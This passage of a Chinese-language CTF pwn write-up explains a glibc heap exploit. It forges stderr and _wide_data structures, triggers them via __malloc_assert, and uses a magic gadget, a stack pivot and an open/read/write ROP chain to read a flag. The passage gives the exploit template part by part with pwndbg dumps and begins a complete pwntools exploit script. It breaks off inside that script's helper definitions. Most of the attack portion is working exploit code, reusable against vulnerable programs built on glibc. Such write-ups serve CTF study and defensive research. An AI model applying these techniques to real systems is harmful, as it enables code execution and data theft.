+<div class="highlight"><pre><span></span><span class="n">pl</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a0e0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x2e20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x3263</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">pl</span><span class="p">)</span>
+<span class="cp">#chunk9+0x30  main_arena+1120</span>
+<span class="cp">#chunk9+0x30  &amp;TopChunk_Size+3 -0x20</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="err">#</span><span class="n">ub</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> 
+<span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="n">b</span><span class="sc">'a'</span><span class="p">)</span> <span class="err">#</span><span class="n">attack</span>
+</pre></div>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083626-be933e22-c912-1.png"/>​</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083632-c2776f0e-c912-1.png"/>​</p>
+<p>‍</p>
+<h5 data-content="1" id="4ee95752fe5b50cf2c7293fed95529c5">模板详解：</h5>
+<h6 data-content="1" id="59505aeb10399913357d41dbb6b3a311">part 1</h6>
+<div class="highlight"><pre><span></span><span class="c1">#print('==============================================part 1</span>
+<span class="n">chunk0</span> <span class="o">=</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0xfc0</span>
+<span class="n">fake_file</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">chunk0</span><span class="o">+</span><span class="mh">0x1c0</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span>
+<span class="c1">#_IO_save_base -- _IO_2_1_stderr_+72</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">lock</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+<span class="c1">#_IO_stdfile_2_lock</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">chunk0</span><span class="o">+</span><span class="mh">0xe0</span><span class="p">)</span> <span class="c1">#wide_data start</span>
+<span class="c1">#_wide_data</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_wfile_jumps</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="c1">#vtable</span>
+<span class="n">fake_file</span><span class="o">+=</span><span class="n">wide_data</span>
+</pre></div>
+<p>构造后的stderr，我们将_IO_save_base改为chunk0+0x1c0+0x30</p>
+<p>将_wide_data地址改为我们送入chunk0中的payload中wide_data这部分的地址，以进行_wide_data结构体的构造</p>
+<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="n">stderr</span>
+<span class="err">$</span><span class="mi">3</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">_flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x431</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x431</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x7f0cbec1a0d0</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">1104</span><span class="o">&gt;</span> <span class="s">"</span><span class="se">\300\240\301\276\f\177</span><span class="s">"</span><span class="p">,</span>
+  <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x7f0cbec1a0d0</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">1104</span><span class="o">&gt;</span> <span class="s">"</span><span class="se">\300\240\301\276\f\177</span><span class="s">"</span><span class="p">,</span>
+  <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x7f0cbec1a680</span> <span class="o">&lt;</span><span class="n">_IO_list_all</span><span class="o">&gt;</span> <span class="s">"</span><span class="se">\240\246\301\276\f\177</span><span class="s">"</span><span class="p">,</span>
+  <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x7f0cbec1a840</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stdout_</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;</span> <span class="s">""</span><span class="p">,</span>
+  <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_save_base</span> <span class="o">=</span> <span class="mh">0x559ea0e1c1b0</span> <span class="o">&lt;</span><span class="n">incomplete</span> <span class="n">sequence</span> <span class="err">\</span><span class="mi">336</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_save_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_markers</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_chain</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_fileno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="n">_flags2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="n">_old_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="n">_cur_column</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="n">_vtable_offset</span> <span class="o">=</span> <span class="mi">0</span> <span class="sc">'\000'</span><span class="p">,</span>
+  <span class="n">_shortbuf</span> <span class="o">=</span> <span class="s">""</span><span class="p">,</span>
+  <span class="n">_lock</span> <span class="o">=</span> <span class="mh">0x7f0cbec1ba60</span> <span class="o">&lt;</span><span class="n">_IO_stdfile_2_lock</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="n">_codecvt</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_wide_data</span> <span class="o">=</span> <span class="mh">0x559ea0e1c0a0</span><span class="p">,</span>
+  <span class="n">_freeres_list</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_freeres_buf</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">__pad5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="n">_unused2</span> <span class="o">=</span> <span class="sc">'\000'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
+<span class="p">}</span>
+</pre></div>
+<p>‍</p>
+<h6 data-content="1" id="53ae9a6a0c721cca0a5e44b8d64f54ca">part 2</h6>
+<div class="highlight"><pre><span></span><span class="cp">#print('==============================================part 2</span>
+<span class="n">wide_data</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="err">#</span><span class="n">_IO_write_ptr</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="n">b</span><span class="err">'</span><span class="n">flag</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">'</span> <span class="err">#</span><span class="n">_statep</span>  <span class="err">#</span><span class="n">flag_addr</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1170</span><span class="p">)</span> <span class="err">#</span><span class="n">wide_data</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="mi">1</span>
+<span class="n">wide_data</span><span class="o">+=</span><span class="n">pivot</span>
+</pre></div>
+<p>看下面我们构造后的_IO_wide_data</p>
+<p>_wide_vtable被我们修改为了chunk0+0x1b0</p>
+<p>​​​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083649-cca2a39a-c912-1.png"/>​​​</p>
+<p>这里的0x000055f6c4a410a0就是我们送入chunk0中的payload中的wide_data这部分的地址（chunk0+0xe0）</p>
+<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="k">struct</span> <span class="n">_IO_wide_data</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x000055f6c4a410a0</span>
+<span class="err">$</span><span class="mi">4</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x1</span> <span class="o">&lt;</span><span class="nl">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x1</span><span class="o">&gt;</span><span class="p">,</span>
+  <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_save_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_save_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+  <span class="n">_IO_state</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">__count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="n">__value</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">__wch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="n">__wchb</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000</span><span class="s">"</span>
+    <span class="p">}</span>
+  <span class="p">},</span>
+  <span class="n">_IO_last_state</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">__count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="n">__value</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">__wch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="n">__wchb</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000</span><span class="s">"</span>
+    <span class="p">}</span>
+  <span class="p">},</span>
+  <span class="n">_codecvt</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">__cd_in</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">step</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+      <span class="n">step_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">__outbuf</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+        <span class="n">__outbufend</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+        <span class="n">__flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__invocation_counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__internal_use</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__statep</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+        <span class="n">__state</span> <span class="o">=</span> <span class="p">{</span>
+          <span class="n">__count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+          <span class="n">__value</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="n">__wch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+            <span class="n">__wchb</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000</span><span class="s">"</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    <span class="n">__cd_out</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">step</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+      <span class="n">step_data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">__outbuf</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+        <span class="n">__outbufend</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+        <span class="n">__flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__invocation_counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__internal_use</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">__statep</span> <span class="o">=</span> <span class="mh">0x67616c66</span><span class="p">,</span>
+        <span class="n">__state</span> <span class="o">=</span> <span class="p">{</span>
+          <span class="n">__count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+          <span class="n">__value</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="n">__wch</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+            <span class="n">__wchb</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000</span><span class="s">"</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">},</span>
+  <span class="n">_shortbuf</span> <span class="o">=</span> <span class="sa">L</span><span class="s">""</span><span class="p">,</span>
+  <span class="n">_wide_vtable</span> <span class="o">=</span> <span class="mh">0x55f6c4a41170</span>
+<span class="p">}</span>
+</pre></div>
+<p>‍</p>
+<p>stderr中储存的chunk0的值会作为rdi送入_IO_wfile_seekoff和_IO_switch_to_wget_mode</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083702-d3f0f674-c912-1.png"/>​</p>
+<p>经过一系列赋值后，我们会执行到chunk0+0xa0+0xe0+0x18地址处，即我们的magic_gadget处</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083710-d8e74bce-c912-1.png"/>​</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083718-ddb39d38-c912-1.png"/>​</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083731-e5592256-c912-1.png"/>​</p>
+<p>执行 _IO_WOVERFLOW劫持程序流到magic_gadget</p>
+<p>‍</p>
+<h6 data-content="1" id="7c986f850020d0993ea7ee5241c5c0db">part 3</h6>
+<div class="highlight"><pre><span></span><span class="c1">#print('==============================================part 3</span>
+<span class="n">pivot</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">magic_gadget</span><span class="p">)</span> <span class="c1">#call rdi+0x88</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">add_rsp_ret</span><span class="p">)</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1178</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1">#pivot+=p64(0)*4 4</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+<span class="n">pivot</span><span class="o">+=</span><span class="n">rop</span>
+</pre></div>
+<p>我们将rbp赋值为chunk0+0x48（--&gt;chunk0+0x1b0）</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083740-ead799f6-c912-1.png"/>​</p>
+<p>而下面会执行到chunk0+0x48 +0x18 + 0x28地址处（即leave_ret处）</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083748-ef79a058-c912-1.png"/>​</p>
+<p>栈迁移</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083756-f44bfc3e-c912-1.png"/>​</p>
+<p>自此，我们完全控制了程序流</p>
+<p>‍</p>
+<h6 data-content="1" id="a8e15a736310eeb147dc85fbd2e8767f">part 4</h6>
+<div class="highlight"><pre><span></span><span class="c1">#print('==============================================part 4</span>
+<span class="c1">#close(0)</span>
+<span class="n">rop</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">close_addr</span><span class="p">)</span>
+<span class="c1">#open('flag',0)</span>
+<span class="n">flag_addr</span><span class="o">=</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x1168</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span><span class="c1"># 'flag' address</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+
+<span class="c1">#read(0,heap_base+0xb40,0x50)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0xb40</span><span class="p">)</span> <span class="c1">#chunk12-0x10</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
+
+<span class="c1">#write(1,heap_base+0xb40,0x50)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0xb40</span><span class="p">)</span> <span class="c1">#chunk12-0x10</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
+</pre></div>
+<p>要注意的一点是由于我们part3的构造，所以我们还要进行add rsp,0x18的调整以执行到rop</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083806-fa69752e-c912-1.png"/>​</p>
+<p>‍</p>
+<p>成功获取flag</p>
+<p>​<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230323083814-ff08d12e-c912-1.png"/>​</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h5 data-content="1" id="62eec54f4169f93039c72eeaf933f62c">触发流程：</h5>
+<blockquote>
+<p>calloc</p>
+<p>‍</p>
+<p>_int_malloc</p>
+<p>‍</p>
+<p>sysmalloc</p>
+<p>‍</p>
+<p>__malloc_assert</p>
+<p>​​</p>
+<p>__fxprintf</p>
+<p>​​</p>
+<p>locked_vfxprintf</p>
+<p>‍</p>
+<p>__vfprintf_internal</p>
+<p>‍</p>
+<p>_IO_wfile_seekoff</p>
+<p>‍</p>
+<p>_IO_switch_to_wget_mode</p>
+<p>‍</p>
+<p>magic_gadget</p>
+<p>‍</p>
+<p>leave_ret</p>
+<p>‍</p>
+<p>rop</p>
+</blockquote>
+<p>​​</p>
+<p>‍</p>
+<h5 data-content="1" id="7cc7e4cd40f3c4793ef4db8788a7a71b">完整exp：</h5>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc.so.6'</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
+<span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf7</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">li</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="se">\x1b</span><span class="s1">[01;38;5;214m'</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x1b</span><span class="s1">[0m'</span><span class="p">)</span>
